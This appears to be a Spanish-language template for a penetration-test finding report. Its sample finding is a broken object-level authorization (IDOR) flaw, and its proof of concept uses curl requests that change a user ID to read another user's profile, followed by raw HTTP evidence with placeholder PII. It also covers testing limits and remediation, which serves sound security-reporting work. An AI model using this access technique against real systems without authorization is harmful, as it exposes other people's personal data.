---
title: "Título de la Vulnerabilidad o Hallazgo"
id: "VULN-01"
severity: "High" # Critical | High | Medium | Low | Info
cvss_v31: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
cvss_score: 6.5
cwe: "CWE-639"
asset: "https://api.example.com/v1/users/1234/profile"
status: "PROVEN" # PROVEN (Confirmado) | CANDIDATE (Prerrequisito pendiente) | DISPROVED (Falsificado/Descartado) | MITIGATED (Corregido)
auditor: "tester"
date: "YYYY-MM-DD"
audit_log: "terminal.log"
---

# [VULN-01] Título de la Vulnerabilidad o Hallazgo

## 1. Resumen y Causa Raíz
Descripción clara y concisa de la vulnerabilidad identificada, el componente de software afectado y la falla estructural (por ejemplo, falta de verificación de propiedad en la capa de autorización o deserialización insegura de entradas no sanitizadas).

## 2. Pasos Detallados de Reproducción (PoC)
Pasos deterministas y mínimos para reproducir el comportamiento vulnerable:

1. Autenticarse como usuario con privilegios estándar (Usuario A):
   ```bash
   curl -s -X POST https://api.example.com/v1/auth/login \
     -H "Content-Type: application/json" \
     -d '{"username": "user_a", "password": "SafePassword123!"}'
   ```
2. Realizar petición al recurso perteneciente al Usuario B manipulando el identificador del objeto:
   ```bash
   curl -i -s -X GET https://api.example.com/v1/users/9999/profile \
     -H "Authorization: Bearer <TOKEN_USUARIO_A>"
   ```
3. Observar la respuesta no autorizada con datos confidenciales.

## 2b. Control Negativo (Negative Control)
Petición de control para certificar que el backend valida activamente el secreto/recurso y descartar falsos positivos por endpoints abiertos o respuestas 200 genéricas:
```bash
# Ejemplo: Petición sin token o con token alterado devuelve 401/403
curl -i -s -X GET https://api.example.com/v1/users/9999/profile \
  -H "Authorization: Bearer <TOKEN_INVALIDO>"
# Resultado esperado del control: HTTP 401 Unauthorized
```

## 2c. Verificación Acotada No Destructiva (Bounded Testing Standard)
- **Alcance acotado**: Máximo 1 a 3 peticiones de confirmación determinista sobre objetos ajenos.
- **Sin denegación de servicio**: Respeto al rate-limit del engagement sin estrés de recursos ni fuerza bruta masiva.
- **Reversión de estado**: No se ejecutaron modificaciones irreversibles ni borrado de datos.

## 3. Petición y Respuesta Crudas (Raw HTTP Evidence)

### Petición HTTP:
```http
GET /v1/users/9999/profile HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGciOi...
User-Agent: curl/8.5.0
Accept: */*
```

### Respuesta HTTP:
```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 142

{
  "user_id": 9999,
  "email": "victim_user@example.com",
  "ssn": "XXX-XX-1234",
  "role": "customer"
}
```

## 4. Demostración de Impacto en el Negocio
Explicación del riesgo real para la organización (exfiltración masiva de datos personales PII, evasión de pagos, control administrativo o interrupción de operaciones críticas).

## 5. Remediación Sugerida
- Implementar controles de acceso basados en contexto y propiedad a nivel de controlador o repositorio de datos.
- Validar que el identificador de sesión coincida explícitamente con el propietario del recurso solicitado antes de ejecutar la consulta.
- Utilizar identificadores indirectos no predecibles (UUID v4) en sustitución de claves numéricas secuenciales.

## 6. Referencias
- [OWASP API Security Top 10 - API1:2023 Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
